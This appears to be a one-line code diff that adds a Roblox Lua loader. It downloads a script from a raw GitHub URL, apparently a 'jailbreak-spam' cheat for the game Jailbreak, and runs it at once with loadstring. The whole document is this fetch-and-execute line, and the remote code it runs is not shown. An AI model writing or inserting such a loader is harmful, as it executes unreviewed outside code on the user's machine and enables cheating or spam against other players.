@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/jailbreak-spam1-5kr092j1iilvv2.lua"))()
